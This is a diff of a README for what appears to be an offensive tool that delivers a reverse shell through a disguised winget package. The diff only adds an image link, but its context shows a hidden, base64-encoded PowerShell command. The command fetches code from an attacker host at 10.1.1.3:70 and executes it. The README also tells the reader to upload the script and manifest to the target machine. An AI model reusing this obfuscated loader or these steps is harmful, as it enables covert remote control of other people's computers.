@@ -56,6 +56,8 @@ $encoded
 # Encoded & used in the scripts to reverse-shell the targeted machine
 powershell -WindowStyle hidden -e "JABlAD0ASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAxAC4AMQAuADMAOgA3ADAALwBzAHAALQBoAG8AYQB4AC8AaQBuAGYAbwAiADsAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AZQAgACQAZQA="
 ```
+<img src="https://github.com/SentinelSamuel/sp-winget-RS-hoax/blob/main/img-for-Readme/Picture5.png" width="500">
+
 
 ## AFTER INSTALLING AND DOING EVERYTHING IN THE sp-hoaxshell
 Winget.ps1 & winget-manifest.yml --> upload on the target machine
